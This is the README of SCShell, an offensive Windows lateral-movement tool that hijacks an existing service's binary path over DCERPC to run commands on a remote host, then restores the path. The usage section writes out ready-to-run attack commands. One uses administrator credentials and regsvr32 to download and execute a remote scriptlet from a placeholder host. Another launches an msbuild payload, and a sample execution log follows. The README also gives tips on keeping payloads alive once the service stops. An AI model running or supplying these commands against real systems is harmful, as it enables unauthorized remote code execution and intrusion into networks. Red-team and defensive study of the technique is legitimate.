# SCShell

Fileless lateral movement tool that relies on ChangeServiceConfigA to run command. The beauty of this tool is that it doesn't perform authentication against SMB everything is performed over DCERPC.

The utility can be used remotely WITHOUT registering a service or creating a service. It also doesn't have to drop any file on the remote system* (Depend on the technique used to execute)

# How it work

Instead of creating a service it simply remotely open a service and modify the binary path name via the `ChangeServiceConfigA` API.

Then it starts the service.

Once the execution is completed the service binary path is reverted to the original one. The original service path is extracted using `QueryServiceConfigA`.

Everything is happening over DCERPC including the authentication.

![network](https://raw.githubusercontent.com/Mr-Un1k0d3r/SCShell/master/network.png)



# Usage

The current build is written in `C` but I will port it to `C#` and `PowerShell`.

```
Usage:
SCShell.exe target service payload username domain password
```

`target` can be set to `local` to run the payload locally

Remote execution
```
SCShell.exe 192.168.197.131 XblAuthManager "C:\windows\system32\cmd.exe /c C:\windows\system32\regsvr32.exe /s /n /u /i://your.website/payload.sct scrobj.dll" administrator . Password
```

I recommend using `C:\windows\system32\cmd.exe /c` to make sure to payload will not be killed once the service stop. You NEED to use the full path.

You can also use a msbuild payload
```
SCShell.exe 192.168.197.131 XblAuthManager "C:\windows\system32\cmd.exe /C C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe C:\payload.csproj" administrator . Password
SCShell ***
Trying to connect to 192.168.197.131
Username was provided attempting to call LogonUserA
SC_HANDLE Manager 0x009ED250
Opening XblAuthManager
SC_HANDLE Service 0x009ED1B0
Service path was changed to C:\windows\system32\cmd.exe /C C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe C:\payload.csproj
Service was started.
```

I'm using the XblAuthManager as the target which is the Xbox Accessory Management Service

# Compiling from source

The code was compiled on Windows using GCC Mingw compiler

# Credit
Mr.Un1k0d3r RingZer0 Team

Tazz0 for the moral support
